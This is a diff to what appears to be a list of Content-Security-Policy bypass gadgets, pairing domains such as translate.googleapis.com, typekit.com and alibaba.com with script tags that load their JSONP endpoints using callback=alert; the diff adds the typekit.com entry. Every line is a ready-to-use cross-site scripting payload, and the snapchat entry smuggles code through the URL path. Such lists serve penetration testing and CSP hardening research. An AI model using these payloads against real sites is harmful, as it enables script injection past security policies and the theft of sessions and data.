@@ -179,6 +179,7 @@ translate.googleapis.com	<script src="https://translate.googleapis.com/$discover
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
 tr.indeed.com	<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>
 tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/')%7Dcatch(e)%7B%7D%7D()%3balert(1)%2f%2f.js"></script>
+typekit.com	<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>
 udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>
 ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>
 uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
@@ -226,3 +227,4 @@ yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.bl
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
 zhuanjia.sogou.com	<script src="https://zhuanjia.sogou.com/base/ajax/login/login-init?callback=alert(1)-"></script>
 omtr2.partners.salesforce.com   <script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
+
